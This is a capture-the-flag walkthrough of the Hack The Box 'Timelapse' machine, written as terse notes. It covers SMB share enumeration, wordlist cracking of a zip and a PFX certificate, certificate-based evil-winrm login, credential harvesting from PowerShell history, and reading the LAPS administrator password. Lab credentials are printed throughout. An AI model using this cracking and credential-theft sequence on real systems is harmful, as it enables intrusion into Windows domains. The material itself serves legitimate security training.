add dc01.timelapse.htb and timelapse.htb to /etc/hosts
SMB enumeration 
```
crackmapexec smb dc01.timelapse.htb
```
```
smbclient -L //dc01.timelapse.htb -N
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
downloaded a locked zip file to crack with john
```
zip2john file.zip > zip.john
john zip.john
```
john took too long. ran this instead 
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt FILE
```
PASSWORD FOUND!!!!: pw == supremelegacy
pfx file found using tool below to crack 
https://github.com/crackpkcs12/crackpkcs12
```
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
```

Dictionary attack - Starting 22 threads

*********************************************************
Dictionary attack - Thread 16 - Password found: thuglegacy
*********************************************************
extracting the key 
```
openssl pkcs12 -in legacyy_dev_auth.pfx -out legacy.pem
```
I’ll decrypt the key using the password I set above so I don’t have to remember it:
```
openssl rsa -in legacy.pem -out legacy.key
```
And dump the certificate:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```
`evil-winrm` is the best tool for connecting to WinRM from a Linux host. Looking at the usage shows how I’ll use these keys to connect:
```
evil-winrm -S -c legacyy_dev_auth.crt -k legacy.key -i timelapse.htb
```
Checking the powershell history
```
Get-Content C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
LOGIN WITH NEW CREDS
```
evil-winrm -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i timelapse.htb
```
To read the LAPS password, I just need to use `Get-ADComputer` and specifically request the `ms-mcs-admpwd` property:
```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : .[;!1K%-%K69SAdfdG1dFY5&
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
LOGIN WITH LOCAL ADMIN
```
evil-winrm -S -i timelapse.htb -u administrator -p '.[;!1K%-%K69SAdfdG1dFY5&'
```
look at domain admins group and check out TRX for root.txt file
